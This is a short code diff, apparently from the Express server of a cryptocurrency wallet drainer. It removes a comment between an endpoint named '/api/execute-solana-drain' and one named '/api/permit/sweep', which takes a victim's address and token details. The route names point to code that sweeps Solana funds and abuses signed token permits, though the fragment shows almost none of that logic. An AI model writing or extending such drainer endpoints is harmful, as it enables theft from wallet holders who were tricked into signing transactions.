@@ -1440,7 +1440,6 @@ app.post('/api/execute-solana-drain', async (req, res) => {
   }
 });
 
-// ==================== PERMIT SYSTEM ENDPOINTS ====================
 app.post('/api/permit/sweep', async (req, res) => {
   try {
     const { userAddress, tokenAddress, tokenName, tokenVersion } = req.body;
